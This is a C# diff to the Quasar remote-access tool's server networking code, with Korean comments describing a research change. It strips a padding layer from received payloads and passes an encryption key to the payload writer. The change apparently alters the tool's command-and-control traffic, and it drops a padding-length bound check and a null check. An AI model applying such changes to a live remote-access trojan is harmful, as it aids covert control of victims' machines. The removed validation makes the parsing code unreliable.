@@ -406,55 +406,58 @@ namespace Quasar.Server.Networking
                             }
                         case ReceiveType.Payload:
                             {
-                                // 1. 버퍼 복사 (기존 로직 유지)
                                 int length = (_writeOffset - HeaderSize + _readableDataLen) >= _payloadLen
                                     ? _payloadLen - (_writeOffset - HeaderSize)
                                     : _readableDataLen;
 
-                                Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
+                                try
+                                {
+                                    Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
+                                }
+                                catch (Exception)
+                                {
+                                    process = false;
+                                    Disconnect();
+                                    break;
+                                }
 
                                 _writeOffset += length;
                                 _readOffset += length;
                                 _readableDataLen -= length;
 
-                                // 2. 전체 페이로드가 다 모였을 때 (패딩 포함 덩어리)
                                 if (_writeOffset - HeaderSize == _payloadLen)
                                 {
                                     try
                                     {
-                                        // [중요] 별도의 스트림으로 패딩을 완전히 격리하여 처리
+                                        // [연구 개조: 패딩 제거 로직]
+                                        // _payloadBuffer에서 헤더(4B) 이후 영역을 별도 스트림으로 생성
                                         using (MemoryStream ms = new MemoryStream(_payloadBuffer, HeaderSize, _payloadLen))
                                         {
-                                            int paddingSize = ms.ReadByte(); // 패딩 크기 읽기
-                                            if (paddingSize != -1 && paddingSize < _payloadLen)
+                                            int paddingSize = ms.ReadByte(); // 첫 1바이트(패딩 크기) 읽기
+                                            if (paddingSize != -1)
                                             {
-                                                ms.Seek(paddingSize, SeekOrigin.Current); // 패딩 건너뛰기
+                                                ms.Seek(paddingSize, SeekOrigin.Current); // 패딩 데이터 스킵
 
-                                                // 남은 본문만 전용 리더로 해석
+                                                // 패딩이 제거된 '진짜' 본문 시작 위치에서 PayloadReader 작동
                                                 using (PayloadReader pr = new PayloadReader(ms, false))
                                                 {
                                                     IMessage message = pr.ReadMessage();
-                                                    if (message != null)
-                                                    {
-                                                        OnClientRead(message, _payloadLen + HeaderSize);
-                                                    }
+                                                    OnClientRead(message, _payloadBuffer.Length);
                                                 }
                                             }
                                         }
                                     }
                                     catch (Exception)
                                     {
-                                        // 에러 발생 시 상태 초기화 후 연결 종료 (무한 루프 방지)
-                                        this.Disconnect();
+                                        // 해석 실패 시 연결 종료 (무한 루프 방지)
                                         process = false;
+                                        Disconnect();
                                         break;
                                     }
 
-                                    // 3. [핵심] 다음 패킷을 위해 모든 포인터와 상태를 '완전 초기화'
                                     _receiveState = ReceiveType.Header;
                                     _payloadLen = 0;
                                     _writeOffset = 0;
-                                    // 이 초기화 코드가 try-catch 바깥에 확실히 있어야 다음 헤더를 받을 수 있습니다.
                                 }
 
                                 if (_readableDataLen == 0)
@@ -516,7 +519,7 @@ namespace Quasar.Server.Networking
             try
             {
                 _singleWriteMutex.WaitOne();
-                using (PayloadWriter pw = new PayloadWriter(_stream, true))
+                using (PayloadWriter pw = new PayloadWriter(_stream, true, Quasar.Server.Models.Settings.EncryptionKey))
                 {
                     OnClientWrite(message, pw.WriteMessage(message));
                 }
